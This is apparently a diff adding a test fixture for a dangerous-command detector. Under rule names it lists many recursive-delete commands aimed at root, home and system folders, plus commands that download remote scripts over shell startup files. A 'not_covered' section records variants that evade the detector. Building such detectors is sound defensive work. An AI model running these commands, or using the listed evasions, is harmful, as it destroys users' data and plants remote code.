+   "cmd": "iwr https://cdn.example.test/profile.ps1 -OutFile $PROFILE",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "iwr https://dl.example.com/profile.ps1 -OutFile $PROFILE",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "iwr https://get.example.com/profile.ps1 -OutFile $PROFILE",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "iwr https://install.example.test/profile.ps1 -OutFile $PROFILE",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "iwr https://scripts.example.invalid/profile.ps1 -OutFile $PROFILE",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "wget -q https://192.0.2.10/install.sh -O ~/.zprofile",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "wget -q https://cdn.example.test/get -O /etc/profile",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "wget -q https://cdn.example.test/install -O ~/.bashrc",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "wget -q https://cdn.example.test/run.sh -O ~/.bash_profile",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "wget -q https://cdn.example.test/v2/install.sh -O /home/alice/.bashrc",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "wget -q https://dl.example.com/get -O ~/.zshrc",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "wget -q https://dl.example.com/install.sh -O /etc/bash.bashrc",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "wget -q https://dl.example.com/install.sh -O ~/.profile",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "wget -q https://get.example.com/get -O $HOME/.bashrc",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "wget -q https://get.example.com/install.sh -O ~/.config/fish/config.fish",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "wget -q https://install.example.test/get -O $HOME/.zshrc",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "wget -qO $HOME/.bashrc https://cdn.example.test/install.sh",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "wget -qO $HOME/.zshrc https://cdn.example.test/install.sh",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "wget -qO /etc/bash.bashrc https://example.com/bootstrap",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "wget -qO /etc/profile https://192.0.2.10/get",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "wget -qO /home/alice/.bashrc https://dl.example.com/v2/install.sh",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "wget -qO ~/.bash_profile https://scripts.example.invalid/run.sh",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "wget -qO ~/.bashrc https://192.0.2.10/setup.sh",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "wget -qO ~/.config/fish/config.fish https://203.0.113.5:8080/bootstrap",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "wget -qO ~/.profile https://get.example.com/v2/install.sh",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "wget -qO ~/.zprofile https://cdn.example.test/install",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "wget -qO ~/.zshrc https://scripts.example.invalid/get",
+   "rule": "rc_download"
+  },
+  {
+   "cmd": "Remove-Item -Force -Recurse C:\\",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "Remove-Item -Path C:\\Windows -Recurse -Force",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "Remove-Item -Recurse -Force $HOME",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "Remove-Item -Recurse -Force $env:USERPROFILE",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "Remove-Item -Recurse -Force $env:USERPROFILE\\*",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "Remove-Item -Recurse -Force C:\\ ",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "Remove-Item -Recurse -Force C:\\Users",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "Remove-Item -Recurse -Force C:\\Users\\alice",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "Remove-Item -Recurse -Force ~",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "Remove-Item C:\\ -Recurse -Force",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "bash -lc 'rm -rf $HOME'",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "bash -lc 'rm -rf /'",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "bash -lc 'rm -rf /etc'",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "bash -lc 'rm -rf /home/alice'",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "bash -lc 'rm -rf ~'",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "bash -lc 'rm -rf ~/*'",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "cd /srv/app && rm --recursive --force /boot",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "cd /srv/app && rm --recursive --force /usr",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "cd /srv/app && rm -Rf /Users/bob",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "cd /srv/app && rm -Rv ~/*",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "cd /srv/app && rm -r -f /home/alice",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "cd /srv/app && rm -rf \"$HOME\"",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "cd /srv/app && rm -rf $HOME/",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "cd /srv/app && rm -rf -- /boot",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "cd /srv/app && rm -rf /home/alice",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "cd /srv/app && rm -rfv /home/alice",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "cd /srv/app && rm -rfv ~/*",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "cd /tmp && rm -rf $HOME",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "cd /tmp && rm -rf /",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "cd /tmp && rm -rf /etc",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "cd /tmp && rm -rf /home/alice",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "cd /tmp && rm -rf ~",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "cd /tmp && rm -rf ~/*",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "cmd /c \"rd /s /q %USERPROFILE%\"",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "del /s /q C:\\*",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "env CI=1 rm -Rf /System",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "env CI=1 rm -fr /bin",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "env CI=1 rm -fr /home",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "env CI=1 rm -r /etc",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "env CI=1 rm -rf $HOME",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "env CI=1 rm -rf ${HOME}",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "env CI=1 rm -rf --no-preserve-root /home/alice",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "env CI=1 rm -rf /Users/bob",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "env CI=1 rm -rf /bin",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "env CI=1 rm -rfv /Users/bob",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "env CI=1 rm -rfv /home",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "find $HOME -delete",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "find $HOME -exec rm -rf {} +",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "find / -delete",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "find / -exec rm -rf {} +",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "find /etc -delete",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "find /etc -exec rm -rf {} +",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "find /home/alice -delete",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "find /home/alice -exec rm -rf {} +",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "find ~ -delete",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "find ~ -exec rm -rf {} +",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "find ~/* -delete",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "find ~/* -exec rm -rf {} +",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "powershell -c \"Remove-Item -Recurse -Force $HOME\"",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "pwsh -Command \"Remove-Item -Recurse -Force ~\"",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rd /s /q %USERPROFILE%",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rd /s /q C:\\",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rd /s /q C:\\Windows",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "ri -Recurse -Force ~\\*",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm --recursive --force \"$HOME\"",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm --recursive --force /root",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -Recurse -Force $HOME\\*",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -Rf \"$HOME\"",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -Rf $HOME",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -Rf /opt",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -Rf ~/",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -Rv /Users/bob",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -Rv ~",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -fr $HOME/",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -fr /System",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -fr /Users/bob",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -r -f ${HOME}",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -r -f /",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -r -f /var/*",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -r -f ~/",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -r -fo ~",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -r ~",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -rf $HOME 2>/dev/null",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -rf $HOME/",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -rf -- /home",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -rf -- ~",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -rf --no-preserve-root ${HOME}",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -rf --no-preserve-root /",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -rf ./build ~/",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -rf / 2>/dev/null",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -rf /*",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -rf /Library",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -rf /System",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -rf /etc 2>/dev/null",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -rf /home/alice 2>/dev/null",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -rf /root",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -rf build /",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -rf node_modules ~",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -rf ~",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -rf ~ 2>/dev/null",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -rf ~/* 2>/dev/null",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -rfv /*",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -rfv /System",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -rfv /opt",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -rfv /root",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rm -rfv /usr",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "rmdir /s /q C:\\Users\\alice",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "sh -c \"rm -rf $HOME\"",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "sh -c \"rm -rf /\"",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "sh -c \"rm -rf /etc\"",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "sh -c \"rm -rf /home/alice\"",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "sh -c \"rm -rf ~\"",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "sh -c \"rm -rf ~/*\"",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "sudo rm --recursive --force $HOME/*",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "sudo rm -Rv /Users/bob",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "sudo rm -Rv /bin",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "sudo rm -fr /Users/bob",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "sudo rm -rf $HOME/*",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "sudo rm -rf ${HOME}",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "sudo rm -rf /System",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "sudo rm -rf /bin",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "sudo rm -rf /etc",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "time rm -Rf /home/alice",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "time rm -Rf ~/*",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "time rm -fr /Users/bob",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "time rm -r -f ~",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "time rm -r -f ~/*",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "time rm -r /home/alice",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "time rm -rf -- ${HOME}",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "true && sudo rm -rf $HOME ; echo done",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "true && sudo rm -rf / ; echo done",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "true && sudo rm -rf /etc ; echo done",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "true && sudo rm -rf /home/alice ; echo done",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "true && sudo rm -rf ~ ; echo done",
+   "rule": "rm_root_home"
+  },
+  {
+   "cmd": "true && sudo rm -rf ~/* ; echo done",
+   "rule": "rm_root_home"
+  }
+ ],
+ "not_covered": [
+  {
+   "cmd": "rm -rf \"$DIR\"",
+   "note": "a variable that may be empty: the value is not known"
+  },
+  {
+   "cmd": "rm -rf *",
+   "note": "the current folder: its location is not known"
+  },
+  {
+   "cmd": "rm -rf .",
+   "note": "the current folder"
+  },
+  {
+   "cmd": "curl -fsSL https://get.example.com/install.sh -o install.sh && sh install.sh",
+   "note": "the script is saved first, then run"
+  },
+  {
+   "cmd": "curl -fsSL https://get.example.com/install.sh | python3",
+   "note": "the interpreter is not a shell"
+  },
+  {
+   "cmd": "curl -fsSL https://get.example.com/x | sudo tee /usr/local/bin/x && sudo chmod +x /usr/local/bin/x",
+   "note": "a downloaded program, not a script run at once"
+  },
+  {
+   "cmd": "python3 -c \"import shutil; shutil.rmtree('/home/alice')\"",
+   "note": "code in another language"
+  },
+  {
+   "cmd": "echo ~ | xargs rm -rf",
+   "note": "the target comes from a pipe"
+  },
+  {
+   "cmd": "rsync -a --delete empty/ ~/",
+   "note": "a different tool"
+  },
+  {
+   "cmd": "git clean -fdx ~",
+   "note": "a different tool"
+  },
+  {
+   "cmd": "sudo rm -rf /usr/local",
+   "note": "below the top-level folders"
+  },
+  {
+   "cmd": "docker run --rm -v /:/host alpine rm -rf /host/etc",
+   "note": "the delete runs inside a container"
+  },
+  {
+   "cmd": "ssh deploy@203.0.113.5 \"rm -rf /\"",
+   "note": "the command runs on another machine"
+  },
+  {
+   "cmd": "truncate -s 0 ~/.bashrc",
+   "note": "a different tool"
+  }
+ ]
+}
